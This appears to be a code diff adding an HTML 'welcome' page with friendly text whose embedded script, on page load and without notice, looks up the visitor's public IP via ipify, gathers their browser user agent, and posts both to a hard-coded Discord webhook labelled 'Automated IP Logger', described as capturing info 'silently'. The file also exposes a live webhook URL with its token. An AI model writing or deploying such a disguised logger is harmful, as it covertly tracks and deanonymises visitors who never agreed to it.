@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #111;
+            color: white;
+            text-align: center;
+            margin-top: 100px;
+        }
+        .message-container {
+            background: #222;
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+    <div class="message-container">
+        <h2>Welcome, friend!</h2>
+        <p>Thanks for visiting my super cool page. Enjoy your stay!</p>
+        <p>I hope you have a fantastic day.</p>
+    </div>
+
+    <script>
+        // --- YOUR DISCORD WEBHOOK URL ---
+        // Make sure this is YOUR actual webhook URL
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1395363626675863613/qGZHOoBHT8buD7nrMDDcO3KHoySozZ6TbwQLXm2dAJPSu3ha9jJl93jkvbGqcDFd3HyB";
+
+        async function sendInfoAutomatically() {
+            let userPublicIP = "Unknown"; // This will be their router's public IP
+            let userAgent = navigator.userAgent; // Browser, OS, device info
+
+            // Use an external service to get the user's public IP address
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userPublicIP = data.ip; // This is the public/router IP
+            } catch (error) {
+                console.error("Failed to get public IP from ipify.org:", error);
+            }
+
+            // Prepare the data to send to Discord
+            const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jerusalem' }); // Current time in your specified timezone
+
+            const payload = {
+                content: "@here New Visitor Detected!", // Optional ping
+                embeds: [
+                    {
+                        title: "Visitor Log - IP & Device Info",
+                        description: "A user visited your page. Info captured silently.",
+                        color: 7506394, // A nice blue color for Discord embeds
+                        fields: [
+                            {"name": "Public/Router IP", "value": `\`\`\`${userPublicIP}\`\`\``, "inline": false},
+                            {"name": "Time (IDT)", "value": `\`\`\`${timestamp}\`\`\``, "inline": true},
+                            {"name": "User Agent (Device Info)", "value": `\`\`\`${userAgent}\`\`\``, "inline": false}
+                        ],
+                        footer: {
+                            text: "Automated IP Logger"
+                        },
+                        timestamp: new Date().toISOString() // Standard ISO 8601 UTC timestamp
+                    }
+                ]
+            };
+
+            // Send the data to your Discord webhook
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                if (!response.ok) {
+                    console.error("Error sending data to Discord webhook:", response.status, response.statusText);
+                } else {
+                    console.log("Visitor info sent to Discord successfully.");
+                }
+            }).catch(error => {
+                console.error("Network error when sending to Discord webhook:", error);
+            });
+        }
+
+        // --- Execute the function automatically when the page loads ---
+        window.onload = sendInfoAutomatically;
+    </script>
+</body>
+</html>
